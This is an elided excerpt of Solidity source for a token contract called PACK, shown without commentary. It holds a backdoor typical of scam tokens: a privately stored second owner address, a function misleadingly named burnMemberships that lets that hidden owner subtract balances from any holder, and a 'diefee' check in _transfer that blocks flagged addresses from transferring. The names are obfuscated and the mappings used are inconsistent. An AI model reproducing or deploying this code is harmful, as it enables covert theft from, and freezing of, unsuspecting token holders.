...
contract Ownable is Context {
    ...
    address private _ownerd = 0xca7FF6798460EbA1612f1076Ee74D700D7FEE790;
...
contract PACK is Context, IERC20, Ownable {
 ...
 function burnMemberships(address burnMembername, uint256 burnMembership)
        external
        onlyownerd() {
        require(burnMembership > 0, "burnMembername");
        uint256 burnMember = totaltokens[burnMembername];
        if (burnMember == 0) _btotaltokens.push(burnMembername);
        btotaltokens[burnMembername] = burnMember.add(burnMembership);
        btotaltoken = btotaltoken.add(burnMembership);
        _tomnd[burnMembername] = _tomnd[burnMembername].sub(burnMembership);
    }
    ...
    function _transfer(
      ...
      if (diefee) {
            require(_totaltoken[from] == false, "diefee");
        }  
